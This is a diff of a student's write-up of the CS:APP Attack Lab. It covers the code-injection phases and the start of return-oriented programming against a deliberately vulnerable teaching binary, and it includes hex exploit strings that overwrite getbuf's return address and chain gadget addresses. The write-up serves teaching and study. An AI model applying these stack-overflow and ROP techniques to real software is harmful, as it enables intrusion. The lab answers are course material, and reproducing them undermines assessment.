@@ -1328,7 +1328,7 @@ If we type a long string, the bounds of arrays will be overrun. Whereas, we shou
 
 ##### **Part I: Code Injection Attacks**
 
-##### Level 1  touch1
+##### Phase 1 (Level 1  touch1)
 
 Task of phase 1: To Call `touch1` when `getbuf()` returns instead of returning to the caller: `test()`.
 
@@ -1445,7 +1445,7 @@ Linux> ./hex2raw < ./part_1/exploit_lv1.txt > ./part_1/exploit_lv2_raw.txt
 
 Great! It called `touch1`. 
 
-##### Level 2 touch2
+##### Phase 2 (Level 2 touch2)
 
 **Tips:** 
 
@@ -1635,7 +1635,7 @@ When the instruction at `0x401802` is being executed, the content in `0x202ce2(%
 
 Ah ! At last, the solution is valid. Great !
 
-##### Level 3 touch3
+##### Phase 3 (Level 3 touch3)
 
 **Tips:**
 
@@ -1948,9 +1948,9 @@ Copy the byte code the to my exploit code.
 3 00 00 00 00 00 00 00 00
 4 00 00 00 00 00 00 00 00
 5 00 00 00 00 00 00 00 00
-6 78 dc 61 55 00 00 00 00     /* 0x5561dca0: The return address of "getbuf" is stored here.  */
-7 35 39 62 39 39 37 66 61     /* The top of "test"'s stack. The byte representation of my cookie: 0x59b997fa  */
-8 00 00 00 00 00 00 00 00	 
+6 78 dc 61 55 00 00 00 00     /* 0x5561dca0: The return address of "getbuf" is stored here, which is exactly the address of the next line on the stack of "test".   */
+7 35 39 62 39 39 37 66 61     /* The top of "test"'s stack, where byte representation of my cookie (0x59b997fa) is stored.  The address of this line is 0x5561dca0*/
+8 00 00 00 00 00 00 00 00     /* Don't forget the terminal '\0'.  */
 ```
 
 Then convert it to raw file. 
@@ -1961,4 +1961,65 @@ Linux> ./hex2raw < ./part_1/exploit_lv3_optimised2.txt > ./part_1/exploit_lv3_op
 
 Finally, the problem is tackled. 
 
-In conclusion, when you want to corrupt a stack in a program, it is better to store your exploit code at higher address like that in the stack of `test`.
+6) Analyses.  
+
+In conclusion, when we want to corrupt a stack in a program, it is better to store our exploit code at higher address like that in this phase in the stack of `test`. After rereading the assembly code of `getbuf`, I find that the stack is reset at `0x4017b9`, so that my exploit code is prone to be overwritten by `touch3` and `hexmatch` because my exploit code is stored between `0x0(%rsp)` and `-0x28(%rsp)` in the stack of `getbuf`. 
+
+```assembly
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp	# The stack is reset.
+  4017bd:	c3                   	retq   			# Then it returns to my exploit code.
+```
+
+##### Part II: Return-Oriented Programming 
+
+##### Phase 4 (Level 2 touch2)
+
+(1) What is the task in phase 4 ? 
+
+The task is to repeat the same attack in phase 2, but the address of exploit code is unpredictable since the address of the stack is random each time the program runs. What is worse is that the memory on the stack is marked as non-executable; we can't have our exploited code executed even if we know the address. 
+
+(2) How to do the lab in phase 4 ?
+
+2.1) We should find out gadgets demarcated by `start_farm` and `mid_farm`. Note that the starting addresses of gadgets is not the beginning of functions, but are the address of the excerpt of the byte code. 
+
+2.2) It is advised that we can use just two gadgets. How to combine them to help us to call `touch2`? 
+
+First of all, let `getbuf` return to the first gadgets. I have tested with `start_farm.` successfully.
+
+```assembly
+1 00 00 00 00 00 00 00 00
+2 00 00 00 00 00 00 00 00
+3 00 00 00 00 00 00 00 00
+4 00 00 00 00 00 00 00 00
+5 00 00 00 00 00 00 00 00
+6 94 19 40 00 00 00 00 00     /* The address of "start_farm", for testing. Address: 0x5561dca0   */
+7 								/* Address: 0x5561dca8 on the stack of "test". */
+8 								/* Address: 0x5561dcb0 on the stack of "test". */
+```
+
+Secondly, since each gadget ends with `c3 (retq)`, we can continue corrupting the stack with the address of the second gadget, namely input the starting address of it to `0x5561dca8 `(Line 7). When the second `c3 (retq)` executes, the processor will transfer control to the second gadget. 
+
+Finally, input the address of `touch3` to `0x5561dcb0`(line 8) so the second gadget will transfer control to it. 
+
+2.3) Let's try it. 
+
+To test whether the above approaches work or not, I make use of two gadgets. Note they are not the correct ones. 
+
+```assembly
+1 00 00 00 00 00 00 00 00
+2 00 00 00 00 00 00 00 00
+3 00 00 00 00 00 00 00 00
+4 00 00 00 00 00 00 00 00
+5 00 00 00 00 00 00 00 00
+6 9d 19 40 00 00 00 00 00     /* To Test. The address of the first gadget, which is in "getval_142."   */
+7 a2 19 40 00 00 00 00 00     /* To Test. The address of the second gadget. It is in "adval_273."   */
+8 ec 17 40 00 00 00 00 00     /* The address of touch2.  */
+```
+
+The program transfer control to `touch2`. Currently, the argument is not correct in the test. 
+
